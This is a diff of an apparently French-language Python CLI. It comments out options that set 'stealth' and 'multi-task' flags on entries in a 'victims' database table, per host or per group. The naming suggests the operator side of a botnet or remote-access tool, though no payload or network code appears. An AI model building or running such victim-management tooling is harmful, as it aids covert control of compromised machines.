@@ -305,12 +305,12 @@ elif args.showall:
 ############################################################
 
 
-elif args.endpoint:
-    if args.group:
-        parser.error("--endpoint n'accepte pas l'argument --group")
-    elif not args.host:
-        parser.error("--endpoint nécessite l'argument --host")
-    print("connexion VPN sur " + args.host)
+# elif args.endpoint:
+#     if args.group:
+#         parser.error("--endpoint n'accepte pas l'argument --group")
+#     elif not args.host:
+#         parser.error("--endpoint nécessite l'argument --host")
+#     print("connexion VPN sur " + args.host)
 
 
 ############################################################
@@ -379,145 +379,145 @@ elif args.scan:
 ############################################################
 
 
-elif args.stealth:
-    if not args.host and not args.group:
-        parser.error("--stealth nécessite l'argument --host et/ou --group")
+# elif args.stealth:
+#     if not args.host and not args.group:
+#         parser.error("--stealth nécessite l'argument --host et/ou --group")
 
-    elif args.host and args.group:
-        parser.error("--stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
+#     elif args.host and args.group:
+#         parser.error("--stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
 
-    elif args.no_stealth:
-        parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
+#     elif args.no_stealth:
+#         parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
         
-    elif args.host:
-        print("activation du mode stealth sur " + args.host)
+#     elif args.host:
+#         print("activation du mode stealth sur " + args.host)
 
-        query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id = %s OR uid = %s"
+#         query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id = %s OR uid = %s"
 
-        for victim in args.host.split(","):
-            values = (victim, victim, victim)
-            mycursor.execute(query, values)
+#         for victim in args.host.split(","):
+#             values = (victim, victim, victim)
+#             mycursor.execute(query, values)
 
     
-    elif args.group:
-        print("activation du mode stealth sur " + args.group)
+#     elif args.group:
+#         print("activation du mode stealth sur " + args.group)
 
-        query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+#         query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
 
-        for group in args.group.split(","):
-            values = (group, )
-            mycursor.execute(query, values)
+#         for group in args.group.split(","):
+#             values = (group, )
+#             mycursor.execute(query, values)
 
-    else:
-        parser.error("mauvaise utilisation de --stealth. Veuillez vous référer à l'aide")
+#     else:
+#         parser.error("mauvaise utilisation de --stealth. Veuillez vous référer à l'aide")
+
+
+# ############################################################
+
+
+# elif args.no_stealth:
+#     if not args.host and not args.group:
+#         parser.error("--no-stealth nécessite l'argument --host et/ou --group")
+
+#     elif args.host and args.group:
+#         parser.error("--no-stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
+
+#     elif args.stealth:
+#         parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
+        
+#     elif args.host:
+#         print("désactivation du mode stealth sur " + args.host)
+
+#         query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id = %s OR uid = %s"
+
+#         for victim in args.host.split(","):
+#             values = (victim, victim, victim)
+#             mycursor.execute(query, values)
+
+    
+#     elif args.group:
+#         print("désactivation du mode stealth sur " + args.group)
+
+#         query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+
+#         for group in args.group.split(","):
+#             values = (group, )
+#             mycursor.execute(query, values)
+
+#     else:
+#         parser.error("mauvaise utilisation de --no-stealth. Veuillez vous référer à l'aide")
 
 
 ############################################################
 
 
-elif args.no_stealth:
-    if not args.host and not args.group:
-        parser.error("--no-stealth nécessite l'argument --host et/ou --group")
+# elif args.multi_task:
+#     if not args.host and not args.group:
+#         parser.error("--multi-task nécessite l'argument --host et/ou --group")
 
-    elif args.host and args.group:
-        parser.error("--no-stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
+#     elif args.host and args.group:
+#         parser.error("--multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
 
-    elif args.stealth:
-        parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
+#     elif args.no_multi_task:
+#         parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
         
-    elif args.host:
-        print("désactivation du mode stealth sur " + args.host)
+#     elif args.host:
+#         print("activation du mode multi-task sur " + args.host)
 
-        query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id = %s OR uid = %s"
+#         query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id = %s OR uid = %s"
 
-        for victim in args.host.split(","):
-            values = (victim, victim, victim)
-            mycursor.execute(query, values)
+#         for victim in args.host.split(","):
+#             values = (victim, victim, victim)
+#             mycursor.execute(query, values)
 
     
-    elif args.group:
-        print("désactivation du mode stealth sur " + args.group)
+#     elif args.group:
+#         print("activation du mode multi-task sur " + args.group)
 
-        query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+#         query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
 
-        for group in args.group.split(","):
-            values = (group, )
-            mycursor.execute(query, values)
+#         for group in args.group.split(","):
+#             values = (group, )
+#             mycursor.execute(query, values)
 
-    else:
-        parser.error("mauvaise utilisation de --no-stealth. Veuillez vous référer à l'aide")
+#     else:
+#         parser.error("mauvaise utilisation de --multi-task. Veuillez vous référer à l'aide")
 
 
 ############################################################
 
 
-elif args.multi_task:
-    if not args.host and not args.group:
-        parser.error("--multi-task nécessite l'argument --host et/ou --group")
+# elif args.no_multi_task:
+#     if not args.host and not args.group:
+#         parser.error("--no-multi-task nécessite l'argument --host ou --group")
 
-    elif args.host and args.group:
-        parser.error("--multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
+#     elif args.host and args.group:
+#         parser.error("--no-multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
 
-    elif args.no_multi_task:
-        parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
+#     elif args.multi_task:
+#         parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
         
-    elif args.host:
-        print("activation du mode multi-task sur " + args.host)
+#     elif args.host:
+#         print("désactivation du mode multi-task sur " + args.host)
 
-        query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id = %s OR uid = %s"
+#         query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id = %s OR uid = %s"
 
-        for victim in args.host.split(","):
-            values = (victim, victim, victim)
-            mycursor.execute(query, values)
+#         for victim in args.host.split(","):
+#             values = (victim, victim, victim)
+#             mycursor.execute(query, values)
 
     
-    elif args.group:
-        print("activation du mode multi-task sur " + args.group)
+#     elif args.group:
+#         print("désactivation du mode multi-task sur " + args.group)
 
-        query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+#         query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
 
-        for group in args.group.split(","):
-            values = (group, )
-            mycursor.execute(query, values)
+#         for group in args.group.split(","):
+#             values = (group, )
+#             mycursor.execute(query, values)
 
-    else:
-        parser.error("mauvaise utilisation de --multi-task. Veuillez vous référer à l'aide")
-
-
-############################################################
-
-
-elif args.no_multi_task:
-    if not args.host and not args.group:
-        parser.error("--no-multi-task nécessite l'argument --host ou --group")
-
-    elif args.host and args.group:
-        parser.error("--no-multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
-
-    elif args.multi_task:
-        parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
-        
-    elif args.host:
-        print("désactivation du mode multi-task sur " + args.host)
-
-        query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id = %s OR uid = %s"
-
-        for victim in args.host.split(","):
-            values = (victim, victim, victim)
-            mycursor.execute(query, values)
-
-    
-    elif args.group:
-        print("désactivation du mode multi-task sur " + args.group)
-
-        query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-
-        for group in args.group.split(","):
-            values = (group, )
-            mycursor.execute(query, values)
-
-    else:
-        parser.error("mauvaise utilisation de --no-multi-task. Veuillez vous référer à l'aide")
+#     else:
+#         parser.error("mauvaise utilisation de --no-multi-task. Veuillez vous référer à l'aide")
 
 
 ############################################################
